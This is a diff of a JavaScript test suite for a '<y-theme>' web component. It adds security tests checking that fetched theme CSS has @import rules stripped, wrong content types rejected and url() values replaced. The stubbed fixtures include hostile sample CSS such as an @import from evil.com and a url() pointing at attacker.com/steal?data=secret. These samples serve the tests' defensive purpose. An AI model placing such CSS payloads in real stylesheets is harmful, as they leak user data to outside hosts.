@@ -1,6 +1,14 @@
 import { fixture, html, expect, waitUntil } from "@open-wc/testing";
 import "./y-theme.js";
 
+/** Helper to build a minimal Response-like object for fetch stubs. */
+function cssResponse(body, contentType = "text/css") {
+    return {
+        headers: new Headers({ "content-type": contentType }),
+        text: async () => body,
+    };
+}
+
 describe("<y-theme>", () => {
     it("renders slotted content", async () => {
         const el = await fixture(
@@ -33,9 +41,7 @@ describe("<y-theme>", () => {
     });
 
     it("applies dark mode when theme='blue-dark'", async () => {
-        const el = await fixture(
-            html`<y-theme theme="blue-dark"></y-theme>`,
-        );
+        const el = await fixture(html`<y-theme theme="blue-dark"></y-theme>`);
 
         // blue-dark sets --base-background-app to a neutral-dark variable
         const bg = el.style.getPropertyValue("--base-background-app");
@@ -43,9 +49,7 @@ describe("<y-theme>", () => {
     });
 
     it("updates applied variables when theme attribute changes", async () => {
-        const el = await fixture(
-            html`<y-theme theme="blue-light"></y-theme>`,
-        );
+        const el = await fixture(html`<y-theme theme="blue-light"></y-theme>`);
 
         const lightBg = el.style.getPropertyValue("--base-background-app");
         expect(lightBg).to.include("light");
@@ -61,9 +65,7 @@ describe("<y-theme>", () => {
     });
 
     it("updates applied variables when switching theme families", async () => {
-        const el = await fixture(
-            html`<y-theme theme="blue-light"></y-theme>`,
-        );
+        const el = await fixture(html`<y-theme theme="blue-light"></y-theme>`);
 
         // Both blue-light and orange-light define --primary-content--.
         // Verify the property is still populated after switching theme.
@@ -74,9 +76,7 @@ describe("<y-theme>", () => {
     });
 
     it("injects two <style> elements into shadow DOM (variables + theme)", async () => {
-        const el = await fixture(
-            html`<y-theme theme="blue-light"></y-theme>`,
-        );
+        const el = await fixture(html`<y-theme theme="blue-light"></y-theme>`);
 
         const styles = el.shadowRoot.querySelectorAll("style");
         expect(styles.length).to.equal(2);
@@ -126,21 +126,13 @@ describe("<y-theme>", () => {
             window.fetch = async (url) => {
                 const str = url.toString();
                 if (str.includes("custom.css"))
-                    return {
-                        text: async () => `:root { --custom-var: hotpink; }`,
-                    };
+                    return cssResponse(`:root { --custom-var: hotpink; }`);
                 if (str.includes("first.css"))
-                    return {
-                        text: async () => `:root { --theme-color: blue; }`,
-                    };
+                    return cssResponse(`:root { --theme-color: blue; }`);
                 if (str.includes("second.css"))
-                    return {
-                        text: async () => `:root { --theme-color: green; }`,
-                    };
+                    return cssResponse(`:root { --theme-color: green; }`);
                 if (str.includes("override.css"))
-                    return {
-                        text: async () => `:root { --override-var: purple; }`,
-                    };
+                    return cssResponse(`:root { --override-var: purple; }`);
                 return originalFetch(url);
             };
         });
@@ -245,7 +237,9 @@ describe("<y-theme>", () => {
         it("blocks a cross-origin theme URL and returns empty CSS when cross-origin attribute is absent", async () => {
             // A URL with a different origin will be blocked without cross-origin attr
             const el = await fixture(
-                html`<y-theme theme="https://evil.example.com/theme.css"></y-theme>`,
+                html`<y-theme
+                    theme="https://evil.example.com/theme.css"
+                ></y-theme>`,
             );
 
             // Wait for _applyTheme to settle
@@ -259,10 +253,13 @@ describe("<y-theme>", () => {
 
         it("allows a cross-origin theme URL when the cross-origin attribute is present", async () => {
             // Stub fetch to return a known cross-origin CSS payload
-            window.fetch = async () => ({ text: async () => `:root { --xo-var: lime; }` });
+            window.fetch = async () => cssResponse(`:root { --xo-var: lime; }`);
 
             const el = await fixture(
-                html`<y-theme cross-origin theme="https://other.example.com/theme.css"></y-theme>`,
+                html`<y-theme
+                    cross-origin
+                    theme="https://other.example.com/theme.css"
+                ></y-theme>`,
             );
 
             await waitUntil(
@@ -287,7 +284,9 @@ describe("<y-theme>", () => {
         });
 
         it("theme setter updates the theme attribute", async () => {
-            const el = await fixture(html`<y-theme theme="blue-light"></y-theme>`);
+            const el = await fixture(
+                html`<y-theme theme="blue-light"></y-theme>`,
+            );
             el.theme = "blue-dark";
             expect(el.getAttribute("theme")).to.equal("blue-dark");
         });
@@ -299,12 +298,247 @@ describe("<y-theme>", () => {
         });
     });
 
+    describe("security: @import stripping", () => {
+        let originalFetch;
+
+        beforeEach(() => {
+            originalFetch = window.fetch;
+        });
+
+        afterEach(() => {
+            window.fetch = originalFetch;
+        });
+
+        it("strips @import rules from fetched CSS", async () => {
+            window.fetch = async () => ({
+                headers: new Map([["content-type", "text/css"]]),
+                text: async () =>
+                    `@import url('https://evil.com/malicious.css');\n:root { --safe-var: green; }`,
+            });
+
+            const el = await fixture(
+                html`<y-theme theme="themed.css"></y-theme>`,
+            );
+
+            await waitUntil(
+                () => el.style.getPropertyValue("--safe-var") === "green",
+            );
+
+            // The safe variable should be applied
+            expect(el.style.getPropertyValue("--safe-var")).to.equal("green");
+
+            // The shadow DOM style should not contain @import
+            const styles = el.shadowRoot.querySelectorAll("style");
+            const themeStyle = styles[styles.length - 2]; // theme style is before <slot>
+            expect(themeStyle.textContent).to.not.include("@import");
+        });
+
+        it("strips multiple @import rules from fetched CSS", async () => {
+            window.fetch = async () => ({
+                headers: new Map([["content-type", "text/css"]]),
+                text: async () =>
+                    `@import url('https://evil.com/a.css');\n@import 'https://evil.com/b.css';\n:root { --multi-var: red; }`,
+            });
+
+            const el = await fixture(
+                html`<y-theme theme="multi-import.css"></y-theme>`,
+            );
+
+            await waitUntil(
+                () => el.style.getPropertyValue("--multi-var") === "red",
+            );
+
+            const styles = el.shadowRoot.querySelectorAll("style");
+            const themeStyle = styles[styles.length - 2];
+            expect(themeStyle.textContent).to.not.include("@import");
+        });
+
+        it("does not strip @import from built-in themes (trusted)", async () => {
+            // Built-in themes bypass _resolveThemeCSS fetch path entirely,
+            // so they are considered trusted. Just verify they still work.
+            const el = await fixture(
+                html`<y-theme theme="blue-light"></y-theme>`,
+            );
+
+            const bg = el.style.getPropertyValue("--base-background-app");
+            expect(bg).to.include("light");
+        });
+    });
+
+    describe("security: content-type validation", () => {
+        let originalFetch;
+
+        beforeEach(() => {
+            originalFetch = window.fetch;
+        });
+
+        afterEach(() => {
+            window.fetch = originalFetch;
+        });
+
+        it("blocks response with application/json content-type", async () => {
+            window.fetch = async () => ({
+                headers: new Map([["content-type", "application/json"]]),
+                text: async () => `{"malicious": true}`,
+            });
+
+            const el = await fixture(html`<y-theme theme="bad.css"></y-theme>`);
+
+            await waitUntil(
+                () => el.shadowRoot.querySelectorAll("style").length >= 1,
+            );
+
+            // Only base style, no theme style
+            expect(el.shadowRoot.querySelectorAll("style").length).to.equal(1);
+        });
+
+        it("blocks response with text/html content-type", async () => {
+            window.fetch = async () => ({
+                headers: new Map([["content-type", "text/html"]]),
+                text: async () => `<html></html>`,
+            });
+
+            const el = await fixture(html`<y-theme theme="bad.css"></y-theme>`);
+
+            await waitUntil(
+                () => el.shadowRoot.querySelectorAll("style").length >= 1,
+            );
+
+            expect(el.shadowRoot.querySelectorAll("style").length).to.equal(1);
+        });
+
+        it("allows response with text/css content-type", async () => {
+            window.fetch = async () => ({
+                headers: new Map([["content-type", "text/css; charset=utf-8"]]),
+                text: async () => `:root { --ct-var: blue; }`,
+            });
+
+            const el = await fixture(
+                html`<y-theme theme="good.css"></y-theme>`,
+            );
+
+            await waitUntil(
+                () => el.style.getPropertyValue("--ct-var") === "blue",
+            );
+
+            expect(el.style.getPropertyValue("--ct-var")).to.equal("blue");
+        });
+
+        it("allows response with text/plain content-type", async () => {
+            window.fetch = async () => ({
+                headers: new Map([["content-type", "text/plain"]]),
+                text: async () => `:root { --tp-var: red; }`,
+            });
+
+            const el = await fixture(
+                html`<y-theme theme="plain.css"></y-theme>`,
+            );
+
+            await waitUntil(
+                () => el.style.getPropertyValue("--tp-var") === "red",
+            );
+
+            expect(el.style.getPropertyValue("--tp-var")).to.equal("red");
+        });
+
+        it("allows response with missing content-type header", async () => {
+            window.fetch = async () => ({
+                headers: new Map(),
+                text: async () => `:root { --no-ct: yes; }`,
+            });
+
+            const el = await fixture(
+                html`<y-theme theme="no-ct.css"></y-theme>`,
+            );
+
+            await waitUntil(
+                () => el.style.getPropertyValue("--no-ct") === "yes",
+            );
+
+            expect(el.style.getPropertyValue("--no-ct")).to.equal("yes");
+        });
+    });
+
+    describe("security: url() sanitization in custom properties", () => {
+        let originalFetch;
+
+        beforeEach(() => {
+            originalFetch = window.fetch;
+        });
+
+        afterEach(() => {
+            window.fetch = originalFetch;
+        });
+
+        it("replaces url() values in custom properties with 'none'", async () => {
+            window.fetch = async () => ({
+                headers: new Map([["content-type", "text/css"]]),
+                text: async () =>
+                    `:root { --bg-image: url('https://attacker.com/steal?data=secret'); }`,
+            });
+
+            const el = await fixture(
+                html`<y-theme theme="exfil.css"></y-theme>`,
+            );
+
+            await waitUntil(
+                () => el.style.getPropertyValue("--bg-image") === "none",
+            );
+
+            expect(el.style.getPropertyValue("--bg-image")).to.equal("none");
+        });
+
+        it("replaces url() in compound values without breaking the rest", async () => {
+            window.fetch = async () => ({
+                headers: new Map([["content-type", "text/css"]]),
+                text: async () =>
+                    `:root { --bg: url(https://evil.com/img.png) no-repeat center; }`,
+            });
+
+            const el = await fixture(
+                html`<y-theme theme="compound.css"></y-theme>`,
+            );
+
+            await waitUntil(() =>
+                el.style.getPropertyValue("--bg").includes("none"),
+            );
+
+            const bg = el.style.getPropertyValue("--bg");
+            expect(bg).to.include("none");
+            expect(bg).to.include("no-repeat");
+            expect(bg).to.not.include("evil.com");
+        });
+
+        it("does not alter safe values without url()", async () => {
+            window.fetch = async () => ({
+                headers: new Map([["content-type", "text/css"]]),
+                text: async () => `:root { --safe-color: hotpink; }`,
+            });
+
+            const el = await fixture(
+                html`<y-theme theme="safe.css"></y-theme>`,
+            );
+
+            await waitUntil(
+                () => el.style.getPropertyValue("--safe-color") === "hotpink",
+            );
+
+            expect(el.style.getPropertyValue("--safe-color")).to.equal(
+                "hotpink",
+            );
+        });
+    });
+
     describe("clearThemeProperties", () => {
         it("removes all inline CSS custom properties previously applied", async () => {
-            const el = await fixture(html`<y-theme theme="blue-light"></y-theme>`);
+            const el = await fixture(
+                html`<y-theme theme="blue-light"></y-theme>`,
+            );
 
             // Variables should have been applied by connectedCallback
-            expect(el.style.getPropertyValue("--spacing-medium").trim()).to.equal("8px");
+            expect(
+                el.style.getPropertyValue("--spacing-medium").trim(),
+            ).to.equal("8px");
 
             el.clearThemeProperties();
 
@@ -313,7 +547,9 @@ describe("<y-theme>", () => {
         });
 
         it("resets the _themeProps array to empty after clearing", async () => {
-            const el = await fixture(html`<y-theme theme="blue-light"></y-theme>`);
+            const el = await fixture(
+                html`<y-theme theme="blue-light"></y-theme>`,
+            );
 
             el.clearThemeProperties();
 
